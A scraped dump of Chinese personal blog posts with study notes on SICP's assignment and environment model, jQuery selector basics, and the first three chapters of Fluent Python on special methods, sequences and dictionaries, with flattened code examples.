为了模拟真实系统里面的实际对象，我们需要使用局部状态变量，来描述对象的状态；由于实际对象的状态会随着时间而变化，因此我们又需要引入赋值，来改变这个状态变量； 引进赋值的收益：引进赋值，可以让我们将对象的状态隐藏在内部，避免对外显示的操作和传递，这样可以减轻我们的负担，使我们更容易模块化的构造系统； 引进赋值的代价：由于时间和状态的存在，同一个东西在不同的时间不再可以相互替换，因为它们导致的结果可能不同，因此我们也将失去引用的透明性；这将使对使用赋值的程序做推理变得非常困难；（我们失去了同一性，不再能两次踏进同一条河流） 引进赋值的缺陷：由于状态的存在，迫使我们不得不考虑赋值的相对顺序，以确保变量在引用的时候，是最新正确的版本；当程序需要应对并发的时候，这个情况将会变得很糟糕； 求值的环境模型 什么是环境？环境是框架的一个序列； 序列是被排成一列的对象，每个元素不是在其他元素之前，就是在其他元素之后，元素之间的顺序很重要； 框架是包含着一些约束的表格；约束将变量关联于某个对应的值；每个框架还包含着一个指针，它指向这个框架对应的外部环境； 一个表达式的意义依赖于它所在的环境，因为这个环境提供了解释这个表达式意义的上下文； 环境模型中，过程的应用和定义使用以下两条规则： 相对于某个给定环境，求值一个 lambda 表达式，将创建一个过程对象，这个过程对象是一个序对，由两部分组成，一部分是 lambda 表达式的正式，一部分是指向环境的指针，指向创建这个过程对象的环境； 将一个过程对象应用于一组实际参数时，它将构造出一个新框架，在这个新框架中，过程原来的形式参数，将约束于实际参数，然后在构造起来的这个新环境里面，求值过程体；这个新环境的外围环境，指向定义过程对象的那个环境（这里很重要，它不是指向调用它的那个环境，而是创建它的环境）； 当在当前环境找（假设为C）不到变量的约束时，将会去当前环境指向的外围环境（假设为B）进行查找，如果还是找不到，将会一路往上，直到全局环境（假设为A），如果仍然没有找到，则会报错提示；特别地再次提醒，一旦找到（假设在A找到），并且变量的约束关联的值，是一个过程对象，那么这个过程对象所创建的新环境，其外围环境是指向定义这个过程对象的环境（即A，而不是B）； 内部定义的特质 内部定义会创建一个局部环境，局部过程对象存在于这个环境中，它们不会与外围环境的同名过程对象发生命令冲突； 对局部过程对象的调用，会构建一个新的子环境，在这个子环境中，可以访问母环境的实际参数，因为实际参数的值被约束在母环境的形式参数中；虽然在局部子环境不能找到要使用的变量的约束，但向上一级的母环境中查找，就可以找到了； 用变动数据做模拟 如果一个数据对象定义了变动数据的操作，称之为变动数据对象；（如果我们不马上求值，我们就不需要马上对求值结果进行保存，从而使得暂时不需要赋值和数据变动，莫非这就是延迟求值技术的核心理念所在？） 变动的表结构（表此处即 list，可以通过 cons 来构造） 共享和相等：在 scheme 里面，对应每个名字的符号是唯一的，scheme 不提供改变符号的方式；而不同序对的实现，是通过构造新序对，然后通过指针指向所需要的符号来实现的；这种实现方式，不可避免的会造成两个不同的序对，共享相同的符号； 好处：scheme 可以通过判断指针是否相等来实现 eq？ 坏处：指针的指向有可能造成循环； 改变即赋值：赋值与变动具有相等的地位，因为可以将环境也看做一种数据结构。从理论上说，为了表示变动数据的行为，所需要的全部东西，只是赋值就够了，即只要将赋值纳入语言即可实现； 队列的表示 由于通过 cons 构造的表，节点之间已经通过指针形成了链接，意思是当知道了头，就可以顺藤摸瓜找到尾，因此通过一个新序对，将它分别指向链表的头和尾，就可以构造出队列，即(cons front-ptr rear-ptr) 双端队列的表示：通过 (cons (cons item prev) next) 双层结构来构建（思考：如果有更复杂的要求，或许可以考虑使用3层、4层或更多层的结构来实现？）； 表格的表示 一维表格：通过双层结构的序对实现 二维表格：通过两个关键码+子表格实现（基于一维表格的双层结构）； 多维表格 错误集 define 既可以用来定义函数，也可以用来赋值，语法为： (define var value)，这里 value 可以是一个值，也可以是一个表达式； 当需要返回一个过程时，函数体里面使用的是 lambda 来定义这个过程，如果没有使用 lambda 就不会返回过程，而变成返回数值了； (define (cons x y) (define (dispatch m) …) dispatch) ;注意此处返回了一个过程；当定义一个函数，需要返回一个过程时，可以使用这种方式； let 定义的变量只能在 let 的 body 内使用，无法让跟 let 平级的其他函数使用；但使用 define 定义的变量，可以被和它平级的内部环境的函数使用； 在递归调用的时候，如果想要实现赋值，需要在 let 定义变量后，再使用内部定义新函数，建立起一个局部环境，在这个局部环境中，可以访问 let 定义的变量，并对其进行赋值，从而记录状态，而不能直接调用全局环境的父函数来实现递归，因为那样会导致另外重新构建另外一个新环境，得到另外一个平行的 temp，这样局部环境的赋值就失效了；正确的做法应该是在父函数建立起来的环境内部，创建局部环境实现递归； cons 函数会返回一个新序对，不会改变老序对；如果需要赋值，需要通过 set! 来实现；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://example.com/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"jQuery","slug":"jQuery","date":"2017-08-14T03:25:00.000Z","updated":"2024-09-22T03:58:54.394Z","comments":true,"path":"2017/08/14/jQuery/","permalink":"http://example.com/2017/08/14/jQuery/","excerpt":"","text":"基础语法：$(selector).action() $ 定义jQuery selector，选择器，选择需要操作的 HTML 元素； action( )，操作； $(document).ready(function(){…}); 所有的 jQuery 函数放在了 document ready 的函数中，目的，避免在 HTML 文档加载结束之前，就开始执行 jQuery，因为这样有可能导致操作失败； 但说不定在某种场景下，在加载前执行函数，或者是有意义的； jQuery 使用 CSS 选择器来选择 HTML 元素，示例如下： $(“p”)：选择 元素； $(“p.intro”)：选择 class &#x3D; “intro” 的 元素（点后面表示类） $(“p#demo”)：选择 id &#x3D; “demo” 的 元素（#后面表示 id） $(“ul li:first”)：选择所有 的第一个 元素 $(“div#intro.head”)：选择 id &#x3D; ‘demo’ 中类名 class &#x3D; ‘head’ 的 元素； jQuery 使用 XPath 来选择带有给属性的元素； $(“[href]”) ：选择带有 href 属性的元素； $(“[href &#x3D; ‘#’]”)：选择 href 属性值为 # 的元素； $(“[href !&#x3D; ‘#’]”)：选择 href 属性值不为 # 元素； $(‘[href $&#x3D; ‘.jpg’]”)：选择 href 属性值以 .jpg 结尾的属性； 一些编码原则 把所有的 jQuery 代码置于事件处理函数中； 所有事件处理函数置于文档就绪事件处理器； 所 jQuery 代码置于单独的 .js 文件中； 如果存在名称冲突，则重命名 jQuery 库； var jq &#x3D; jQuery.noConflict(); 用来取代原来的 $()，变成 js() 动画 几乎所有 CSS 属性都是可以通过 jQuery 的 animate 方法来操作，但有几个注意事项 CSS 属性需要改成驼峰大小写，例如：padding-left 更新为 paddingLeft；margin-right 更新为 marginRight；（这是因为两个单词 css 使用中横杠进行区隔，js 使用驼峰区隔） 色彩动画不包括在 jQuery 的核心库中，需要单独下载 color animation 插件才能实现； stop( ) 方法有两个参数： stopAll，是否停止当前所有的动画，默认 false，即只停止队列当前执行的动画，未执行的继续执行；true 则停止所有队列中的动画； goToEnd，是否立即完成当前播放的动画，然后忽略队列中余下的动画；默认 false； 如果想要在动画完成之后，才执行某个函数，而不是在动画执行的过程中执行（因为动画的播放一般有时间），则应该使用动画方法中的 callback 参数，将要执行的函数做为参数，放在动画的方法中；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"流畅的Python","slug":"流畅的Python","date":"2017-07-25T10:34:00.000Z","updated":"2024-09-22T23:08:41.995Z","comments":true,"path":"2017/07/25/流畅的Python/","permalink":"http://example.com/2017/07/25/%E6%B5%81%E7%95%85%E7%9A%84Python/","excerpt":"","text":"第1章 Python 数据结构一摞 Python 风格的纸牌123456789101112131415import collectionsCard = collections.namedtuple(&#x27;Card&#x27;, [&#x27;rank&#x27;, &#x27;suit&#x27;])class FrenchDeck: ranks = [str(n) for n in range(2, 11)] + list(&#x27;JQKA&#x27;) suits = &#x27;spades diamonds clubs hearts&#x27;.split() def __init__(self): self._cards = [Card(rank, suit) for suit in self.suits for rank in self.ranks] def __len__(self): return len(self._cards) def __getitem__(self, position): return self._cards[position] 上面这个代码示例惊艳到我了，让我对 Python 的类刮目相看；此刻我才开始开始意识到内置方法的存在； 例如它仅仅因为实现了 _len_ 和 _getitem_ 两个特殊方法，便使得这个类能够自动使用 Python 的内置函数，例如 1234567891011121314151617181920212223242526272829303132# 使用 len 函数获得数量 deck = FrenchDeck() len(deck)# 使用索引访问列表中的元素deck[0]deck[-1]# 使用内置的标准库，例如 random，从列表中随机读取元素from random import choicechoice(deck)# 自动支持切片操作deck[:3]deck[12::13]# 自动可迭代for card in deck: print(card) # 自动支持 in 运算符Card(&quot;Q&quot;, &quot;hearts&quot;) in deck# 只需定义排序规则，即可自动支持内置的 sorted 排序函数suit_values = dict(spades=3, hearts=2, diamonds=1, clubs=0)def spades_high(card): rank_value = FrenchDeck.rands.index(card.rand) return rank_value * len(suit_values) + suite_values[card.suit]for card in sorted(deck, key = spades_high): print(card) 如何使用特殊方法特殊方法是为了给解释器调用，从而实现一些内置的功能，而不是为了自己调用；如果是自己调用，那么只需写普通方法即可，无须写特殊方法； 另外，也尽量避免随意添加特殊方法，因为有可能出解释器内置的方法出现命名冲突，导致发生不可预知的情况； 特殊方法还可以用来重载运算符，例如转成字符串，加号，乘号，取绝对值等，示例如下： 1234567891011121314151617181920212223242526from math import hypotclass Vector: def __init__(self, x=0, y=0): self.x = x self.y = y # repr 用来定义对象用字符串如何显示，另外还有一个 str 用来给 str() 或者 print 函数调用 # 通常定义 repr 即可，它更加通用 def __repr__(self): return &#x27;Vector(%r, %r)&#x27; % (self.x, self.y) def __abs__(self): # 重载了 abs 函数 return hypot(self.x, self.y) def __bool__(self): # 当调用 bool 函数时，如何判断对象是否为真 return bool(self.x or self.y) def __add__(self, other): # 重载了加号 x = self.x + other.x y = self.y + other.y return Vector(x, y) def __mul__(self, scalar): # 重载了乘号 return Vector(self.x * scalar, self.y * scalar) 特殊方法一览特殊方法挺多的，有80 多个，其中有 40 个多用于实现算术运算、位运算和比较操作； 为什么 len 不是普通 方法len 的目的是为了读取对象的长度，对于内置类型的对象，它们是用 C 语言的 struct 表示的，struct 里面有个属性存储着长度值，因此在这种情况下，len 会直接去读取 struct 的长度值，而不是调用 _len_ 来计算长度；主要是出于性能考量 本章小结通过实现特殊方法，能够让自定义类型表现跟内置类型一样，从而能够直接使用 Python 的很多内置函数，让代码更容易阅读； 第2章 序列构成的数组内置序列类型Python 有两种序列类型，一种存放的是对象的引用，因此它可以容纳任何类型，称为容器序列；一种存放值，而不是引用，因此只能放相同类型的值，称为扁平序列； 序列按照能否修改，可分为可变序列和不可变序列 可变序列（Mutable Sequence）：list, bytearray, array.array, collections.deque, memoryview 不可变序列（Sequence）：tuple, str, bytes 列表推导和生成器表达式列表推导式（list comprehension）非常适合用来创建新的列表，这种写法更容易读懂；如果列表推导太长，则可以改用传统的 for 循环； 123456&gt;&gt;&gt; colors = [&#x27;black&#x27;, &#x27;white&#x27;]&gt;&gt;&gt; sizes = [&#x27;S&#x27;, &#x27;M&#x27;, &#x27;L&#x27;]&gt;&gt;&gt; tshirts = [(color, size) for color in colors for size in sizes]&gt;&gt;&gt; tshirts[(&#x27;black&#x27;, &#x27;S&#x27;), (&#x27;black&#x27;, &#x27;M&#x27;), (&#x27;black&#x27;, &#x27;L&#x27;), (&#x27;white&#x27;, &#x27;S&#x27;),(&#x27;white&#x27;, &#x27;M&#x27;), (&#x27;white&#x27;, &#x27;L&#x27;)] 生成器表达式用来其他类型的序列；生成器表达式使用圆括号，而不是方括号； 123&gt;&gt;&gt; symbols = &#x27;$¢£¥€¤&#x27;&gt;&gt;&gt; tuple(ord(symbol) for symbol in symbols) # 由于生成器表达式是函数的唯一参数，所以无需用括号括起来(36, 162, 163, 165, 8364, 164) 123&gt;&gt;&gt; import array&gt;&gt;&gt; array.array(&#x27;I&#x27;, (ord(symbol) for symbol in symbols)) # 非唯一参数，所以多加了一层括号array(&#x27;I&#x27;, [36, 162, 163, 165, 8364, 164]) 生成器表达式每次产生一个运算结果，而不是一下生成整个列表，这样可以节省内存，尤其是元素多的时候，非常明显 1234567891011&gt;&gt;&gt; colors = [&#x27;black&#x27;, &#x27;white&#x27;]&gt;&gt;&gt; sizes = [&#x27;S&#x27;, &#x27;M&#x27;, &#x27;L&#x27;]&gt;&gt;&gt; for tshirt in (&#x27;%s %s&#x27; % (c, s) for c in colors for s in sizes): # 一次只生成一个计算结果，而非整个列表... print(tshirt)...black Sblack Mblack Lwhite Swhite Mwhite L 元组不仅仅是不可变的列表元组是不可变列表，但其实它存放的数据，也可以基于顺序来表达不同的含义 12traveler_ids = [(&#x27;USA&#x27;, &#x27;31195855&#x27;), (&#x27;BRA&#x27;, &#x27;CE342567&#x27;), (&#x27;ESP&#x27;, &#x27;XDA205856&#x27;)]# 位置1是国家，位置2是代号 12&gt;&gt;&gt; lax_coordinates = (33.9425, -118.408056)&gt;&gt;&gt; latitude, longitude = lax_coordinates # 元组拆包 12&gt;&gt;&gt; b, a = a, b# 使用拆包，实现变量的值交换 1234&gt;&gt;&gt; divmod(20, 8)(2, 4)&gt;&gt;&gt; t = (20, 8)&gt;&gt;&gt; divmod(*t) # 星号 * 可用来将元组拆包成函数的函数 星号* 可用来存放拆包的余下元素 12345678910111213141516171819&gt;&gt;&gt; a, b, *rest = range(5) # 星号 * 用来存放剩余元素&gt;&gt;&gt; a, b, rest(0, 1, [2, 3, 4]) &gt;&gt;&gt; a, b, *rest = range(3)&gt;&gt;&gt; a, b, rest(0, 1, [2])&gt;&gt;&gt; a, b, *rest = range(2)&gt;&gt;&gt; a, b, rest(0, 1, [])# 放在中间的位置也可以&gt;&gt;&gt; a, *body, c, d = range(5)&gt;&gt;&gt; a, body, c, d(0, [1, 2], 3, 4)# 放在开头的位置也可以&gt;&gt;&gt; *head, b, c, d = range(5)&gt;&gt;&gt; head, b, c, d([0, 1], 2, 3, 4) 嵌套元组拆包1234567891011metro_areas = [ (&#x27;Tokyo&#x27;,&#x27;JP&#x27;,36.933,(35.689722,139.691667)), # 嵌套的元组 (&#x27;Delhi NCR&#x27;, &#x27;IN&#x27;, 21.935, (28.613889, 77.208889)), (&#x27;Mexico City&#x27;, &#x27;MX&#x27;, 20.142, (19.433333, -99.133333)), (&#x27;New York-Newark&#x27;, &#x27;US&#x27;, 20.104, (40.808611, -74.020386)), (&#x27;Sao Paulo&#x27;, &#x27;BR&#x27;, 19.649, (-23.547778, -46.635833)),]for name, cc, pop, (latitude, longitude) in metro_areas: # 嵌套拆包 if longitude &lt;= 0: print(fmt.format(name, latitude, longitude)) 具名元组123456789101112&gt;&gt;&gt; from collections import namedtuple&gt;&gt;&gt; City = namedtuple(&#x27;City&#x27;, &#x27;name country population coordinates&#x27;) # 定义元组结构&gt;&gt;&gt; tokyo = City(&#x27;Tokyo&#x27;, &#x27;JP&#x27;, 36.933, (35.689722, 139.691667)) # 赋值&gt;&gt;&gt; tokyoCity(name=&#x27;Tokyo&#x27;, country=&#x27;JP&#x27;, population=36.933, coordinates=(35.689722,139.691667)) # 各个&gt;&gt;&gt; tokyo.population ➌36.933&gt;&gt;&gt; tokyo.coordinates(35.689722, 139.691667)&gt;&gt;&gt; tokyo[1]&#x27;JP&#x27; 具名元组有一些内置的属性和方法，包括： _fields 属性，用来查看所有字段的名称 _make() 方法，用来创建实例 _asdict() 方法，用来返回 OrderDict 1234567&gt;&gt;&gt; City._fields (&#x27;name&#x27;, &#x27;country&#x27;, &#x27;population&#x27;, &#x27;coordinates&#x27;)&gt;&gt;&gt; LatLong = namedtuple(&#x27;LatLong&#x27;, &#x27;lat long&#x27;)&gt;&gt;&gt; delhi_data = (&#x27;Delhi NCR&#x27;, &#x27;IN&#x27;, 21.935, LatLong(28.613889, 77.208889))&gt;&gt;&gt; delhi = City._make(delhi_data) &gt;&gt;&gt; delhi._asdict() OrderedDict([(&#x27;name&#x27;, &#x27;Delhi NCR&#x27;), (&#x27;country&#x27;, &#x27;IN&#x27;), (&#x27;population&#x27;, 21.935), (&#x27;coordinates&#x27;, LatLong(lat=28.613889, long=77.208889))]) 相对列表，元组没有添加和删除元素的方法，其他方法则都差不多； 切片切片有个特殊的用法，即 s[a : b : c]，它表示在 a ~ b 的区间内，以 c 为间隔取值；即 s[start : stop : step] 123456789&gt;&gt;&gt; s = &#x27;bicycle&#x27;&gt;&gt;&gt; s[::3] # 正序，间隔 3 取值&#x27;bye&#x27;&gt;&gt;&gt; s[::-1] # 倒序，间隔 1 取值&#x27;elcycib&#x27;&gt;&gt;&gt; s[::-2] # 倒序，间隔 2 取值&#x27;eccb&#x27;&gt;&gt;&gt; deck[12::13] # 正序，从 12 开始，间隔 13 取值， 切片有个很有意思的用法，它可以让代码更易读 12345678910111213&gt;&gt;&gt; SKU = slice(0, 6)&gt;&gt;&gt; DESCRIPTION = slice(6, 40)&gt;&gt;&gt; UNIT_PRICE = slice(40, 52)&gt;&gt;&gt; QUANTITY = slice(52, 55)&gt;&gt;&gt; ITEM_TOTAL = slice(55, None)&gt;&gt;&gt; for item in line_items:... print(item[UNIT_PRICE], item[DESCRIPTION]) # 此处的 UNIT_PRICE 也可硬编码，但这样写更优雅...$17.50 Pimoroni PiBrella$4.95 6mm Tactile Switch x20$28.00 Panavise Jr. - PV-201$34.95 PiTFT Mini Kit 320x240 切片也可用来赋值，或者删除 12345678910111213141516171819&gt;&gt;&gt; l = list(range(10))&gt;&gt;&gt; l[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; l[2:5] = [20, 30] # 赋值&gt;&gt;&gt; l[0, 1, 20, 30, 5, 6, 7, 8, 9]&gt;&gt;&gt; del l[5:7] # 删除&gt;&gt;&gt; l[0, 1, 20, 30, 5, 8, 9]&gt;&gt;&gt; l[3::2] = [11, 22] # 赋值&gt;&gt;&gt; l[0, 1, 20, 11, 5, 22, 9]&gt;&gt;&gt; l[2:5] = 100 # 不可行，右侧需要是可迭代对象，不能是数值Traceback (most recent call last):File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: can only assign an iterable&gt;&gt;&gt; l[2:5] = [100] # 可行&gt;&gt;&gt; l[0, 1, 100, 22, 9] 对序列使用 + 和 *加号 + 用来表示将两个序列拼接起来，并返回一个新的序列； 乘号 * 表示重复多份序列并拼接起来 12345&gt;&gt;&gt; l = [1, 2, 3]&gt;&gt;&gt; l * 5[1, 2, 3, 1, 2, 3, 1, 2, 3, 1, 2, 3, 1, 2, 3]&gt;&gt;&gt; 5 * &#x27;abcd&#x27;&#x27;abcdabcdabcdabcdabcd&#x27; 特别注意，在 [a] * n 这个表达式中，如果 a 是一个引用，那么复制出来的是 n 个引用，并且这 n 个引用实际上指向同一个对象； 123456789101112131415# 正确用法，使用列表推导式&gt;&gt;&gt; board = [[&#x27;_&#x27;] * 3 for i in range(3)] &gt;&gt;&gt; board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]&gt;&gt;&gt; board[1][2] = &#x27;X&#x27; &gt;&gt;&gt; board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;X&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]# 错误用法&gt;&gt;&gt; weird_board = [[&#x27;_&#x27;] * 3] * 3 &gt;&gt;&gt; weird_board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]&gt;&gt;&gt; weird_board[1][2] = &#x27;O&#x27; &gt;&gt;&gt; weird_board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;O&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;O&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;O&#x27;]] # 虽然有三个列表，但指向同一个对象 序列的增量赋值自增 +&#x3D; 或者自乘 *&#x3D; 实际上调用的是 _iadd_ 和 _imul_ 方法，如果一个类没有实际 iadd 方法，那么解释器就会调用 add 方法来计算，此时相当于 a &#x3D; a + b，因此，如果 a + b 返回的是一个新的对象，那么 a 将指向该新的对象，而不是改变旧对象的值； 12345678&gt;&gt;&gt; l = [1, 2, 3]&gt;&gt;&gt; id(l)4311953800 ➊&gt;&gt;&gt; l *= 2&gt;&gt;&gt; l[1, 2, 3, 1, 2, 3]&gt;&gt;&gt; id(l)4311953800 ➋ 元组是不可变的，当在元组里面放入一个可变序列时，会出现异常情况，即该可变序列可被改变，但是无法将改变后的新序列，赋值给元组的引用； 1234567&gt;&gt;&gt; t = (1, 2, [30, 40])&gt;&gt;&gt; t[2] += [50, 60]Traceback (most recent call last):File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: &#x27;tuple&#x27; object does not support item assignment # 赋值给 t[2] 的时候报错了&gt;&gt;&gt; t(1, 2, [30, 40, 50, 60]) # 成功改变了序列 list.sort 方法和内置函数 sortedlist.sort 会就地修改列表，返回 None sorted 则不会修改原列表，而是会返回一个新的列表； 用 bisect 来管理已排序的序列bisect 用来从有序列表中查找某个值的插入位置，满足插入后原序列的顺序不变； insort 用来将元素插入到有序列表中，插入后顺序保持不变； 当列表不是首选时数组array.array：数组里面存储的不是对象，而是字面值（例如数字，在内存中直接用字节表示即可）；因此它的读定性能要高很多；但因此它能够存储的类型也比较有限，只有少数几种； 创建数组时，需要通过参数指定类型，以便解释器能够决定如何分配内存空间； 内存视图 memory view 在不复制内容的情况下，操作数组的切片，例如 Numpy； 123456789101112&gt;&gt;&gt; numbers = array.array(&#x27;h&#x27;, [-2, -1, 0, 1, 2])&gt;&gt;&gt; memv = memoryview(numbers) &gt;&gt;&gt; len(memv)5&gt;&gt;&gt; memv[0] -2&gt;&gt;&gt; memv_oct = memv.cast(&#x27;B&#x27;) &gt;&gt;&gt; memv_oct.tolist() [254, 255, 255, 255, 0, 0, 1, 0, 2, 0]&gt;&gt;&gt; memv_oct[5] = 4 # 此处的赋值，改变的是高位字节部分&gt;&gt;&gt; numbersarray(&#x27;h&#x27;, [-2, -1, 1024, 1, 2]) # 原本的 0，因为高位字节改变，变成了 1024 Numpy 和 SciPy操作高阶数组和矩阵的利器； 12345678910111213&gt;&gt;&gt; import numpy ➊&gt;&gt;&gt; a = numpy.arange(12) ➋&gt;&gt;&gt; aarray([ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])&gt;&gt;&gt; type(a)&lt;class &#x27;numpy.ndarray&#x27;&gt;&gt;&gt;&gt; a.shape ➌(12,)&gt;&gt;&gt; a.shape = 3, 4 ➍&gt;&gt;&gt; aarray([[ 0, 1, 2, 3],[ 4, 5, 6, 7],[ 8, 9, 10, 11]]) 双向队列和其他形式的队列虽然可以用列表在模拟队列，但是性能并不好，尤其是在头部插入新元素时；双向队列更方便，而且可以指定长度，在超出长度时，会自动删除较早的内容； 12345678910111213141516171819&gt;&gt;&gt; from collections import deque&gt;&gt;&gt; dq = deque(range(10), maxlen=10) ➊&gt;&gt;&gt; dqdeque([0, 1, 2, 3, 4, 5, 6, 7, 8, 9], maxlen=10)&gt;&gt;&gt; dq.rotate(3) # 旋转，将最后3个元素，放到前面来&gt;&gt;&gt; dqdeque([7, 8, 9, 0, 1, 2, 3, 4, 5, 6], maxlen=10)&gt;&gt;&gt; dq.rotate(-4) # 将头部 4 个元素，放到后面去&gt;&gt;&gt; dqdeque([1, 2, 3, 4, 5, 6, 7, 8, 9, 0], maxlen=10)&gt;&gt;&gt; dq.appendleft(-1) # 添加到头部，会自动删除尾部溢出的部分&gt;&gt;&gt; dqdeque([-1, 1, 2, 3, 4, 5, 6, 7, 8, 9], maxlen=10)&gt;&gt;&gt; dq.extend([11, 22, 33]) # 添加到尾部，会删除头部溢出的部分&gt;&gt;&gt; dqdeque([3, 4, 5, 6, 7, 8, 9, 11, 22, 33], maxlen=10)&gt;&gt;&gt; dq.extendleft([10, 20, 30, 40]) # 逐一添加到头部，因此顺序会反过来&gt;&gt;&gt; dqdeque([40, 30, 20, 10, 3, 4, 5, 6, 7, 8], maxlen=10) 注：append 和 popleft 是原子操作，因此是线程安全的； 除了双向队列，还有以下几种队列，分别是： queue：如果队列满了，不会自动删除旧元素，而是会被锁住；因此可用来控制活跃线程的数量； multiprocessing：用于进程间的通信 asyncio：用于异步编程 heapq：堆队列 第3章 字典和集合字典构造方法 如果一个对象是可散列的，那么它的散列值需要不可变，而且这个对象需要实现 hash 和 eq 方法，以便可以计算散列值并和其他对象做比较； 字典有很多种构造方法 1234567&gt;&gt;&gt; a = dict(one=1, two=2, three=3)&gt;&gt;&gt; b = &#123;&#x27;one&#x27;: 1, &#x27;two&#x27;: 2, &#x27;three&#x27;: 3&#125;&gt;&gt;&gt; c = dict(zip([&#x27;one&#x27;, &#x27;two&#x27;, &#x27;three&#x27;], [1, 2, 3]))&gt;&gt;&gt; d = dict([(&#x27;two&#x27;, 2), (&#x27;one&#x27;, 1), (&#x27;three&#x27;, 3)])&gt;&gt;&gt; e = dict(&#123;&#x27;three&#x27;: 3, &#x27;one&#x27;: 1, &#x27;two&#x27;: 2&#125;)&gt;&gt;&gt; a == b == c == d == eTrue 字典推导字典可以从任何以键值对作为元素的可迭代对象中构造出来 1234567891011121314151617181920&gt;&gt;&gt; DIAL_CODES = [ ➊... (86, &#x27;China&#x27;),... (91, &#x27;India&#x27;),... (1, &#x27;United States&#x27;),... (62, &#x27;Indonesia&#x27;),... (55, &#x27;Brazil&#x27;),... (92, &#x27;Pakistan&#x27;),... (880, &#x27;Bangladesh&#x27;),... (234, &#x27;Nigeria&#x27;),... (7, &#x27;Russia&#x27;),... (81, &#x27;Japan&#x27;),... ]&gt;&gt;&gt; country_code = &#123;country: code for code, country in DIAL_CODES&#125; # 构造1 country : code&gt;&gt;&gt; country_code&#123;&#x27;China&#x27;: 86, &#x27;India&#x27;: 91, &#x27;Bangladesh&#x27;: 880, &#x27;United States&#x27;: 1,&#x27;Pakistan&#x27;: 92, &#x27;Japan&#x27;: 81, &#x27;Russia&#x27;: 7, &#x27;Brazil&#x27;: 55, &#x27;Nigeria&#x27;:234, &#x27;Indonesia&#x27;: 62&#125;&gt;&gt;&gt; &#123;code: country.upper() for country, code in country_code.items() # 构造2 code : country ... if code &lt; 66&#125;&#123;1: &#x27;UNITED STATES&#x27;, 55: &#x27;BRAZIL&#x27;, 62: &#x27;INDONESIA&#x27;, 7: &#x27;RUSSIA&#x27;&#125; 常见的映射方法有个 setdefault 方法不常用，但其实很不错。它的用法如下 1234&gt;&gt;&gt; a = &#123;&quot;abc&quot;: 123&#125;&gt;&gt;&gt; b = a.setdefault(&quot;abc&quot;, 456) # 如果 abc 没值，则赋值456；如果有值，则返回值&gt;&gt;&gt; b123 映射的弹性键查询通常情况下，当我们使用 dict[key] 的方式访问时，如果该 key 不存在，会出现报错；而 collencts.defaultdict 可以处理这种情况；它会将该键为一个预先设定好的默认值，并返回该值 123456789101112import sysimport reimport collectionsWORD_RE = re.compile(r&#x27;\\w+&#x27;)index = collections.defaultdict(list) # list 代表默认的构造方法，如键不存在，则会调用该构造方法，构造默认值with open(sys.argv[1], encoding=&#x27;utf-8&#x27;) as fp: for line_no, line in enumerate(fp, 1): for match in WORD_RE.finditer(line): word = match.group() column_no = match.start()+1 location = (line_no, column_no) index[word].append(location) defaultdict 仅在 dict[key] 下有效，在 dict.get(key) 是无效的，后者不会调用预设的工作方法；defaultdict 背后的工作原理是因为实现了 _missing_ 方法；当 _getitem_ 找不到键名时，默认会调用 missing 方法；因此，只要有实现该方法，即可以实现默认值的初始化和返回； 考虑到 missing 会被调用，那么就可以在这里设置手脚；例如将键名由数值转换字符串，以支持不管传入哪种类型，都可以找到对应的键； 字典的变种collections.OrderDict会记录每个键的添加顺序，然后可以删除最晚或者晚早添加的键； collections.ChainMapChainMap 会将多个 dict 组合成一个 chain，让它表现起来，像是一个 dict 12345678910111213&gt;&gt;&gt; baseline = &#123;&#x27;music&#x27;: &#x27;bach&#x27;, &#x27;art&#x27;: &#x27;rembrandt&#x27;&#125;&gt;&gt;&gt; adjustments = &#123;&#x27;art&#x27;: &#x27;van gogh&#x27;, &#x27;opera&#x27;: &#x27;carmen&#x27;&#125;&gt;&gt;&gt; cm = ChainMap(baseline, adjustments)&gt;&gt;&gt; cmChainMap(&#123;&#x27;music&#x27;: &#x27;bach&#x27;, &#x27;art&#x27;: &#x27;rembrandt&#x27;&#125;, &#123;&#x27;art&#x27;: &#x27;van gogh&#x27;, &#x27;opera&#x27;: &#x27;carmen&#x27;&#125;)&gt;&gt;&gt; list(cm)[&#x27;art&#x27;, &#x27;opera&#x27;, &#x27;music&#x27;]&gt;&gt;&gt; cm[&#x27;music&#x27;]&#x27;bach&#x27;&gt;&gt;&gt; cm[&#x27;art&#x27;]&#x27;rembrandt&#x27;&gt;&gt;&gt; cm.values()ValuesView(ChainMap(&#123;&#x27;music&#x27;: &#x27;bach&#x27;, &#x27;art&#x27;: &#x27;rembrandt&#x27;&#125;, &#123;&#x27;art&#x27;: &#x27;van gogh&#x27;, &#x27;opera&#x27;: &#x27;carmen&#x27;&#125;)) collections.Counter12345678&gt;&gt;&gt; ct = collections.Counter(&#x27;abracadabra&#x27;)&gt;&gt;&gt; ctCounter(&#123;&#x27;a&#x27;: 5, &#x27;b&#x27;: 2, &#x27;r&#x27;: 2, &#x27;c&#x27;: 1, &#x27;d&#x27;: 1&#125;) # 计算每个键的出现次数&gt;&gt;&gt; ct.update(&#x27;aaaaazzz&#x27;) # update 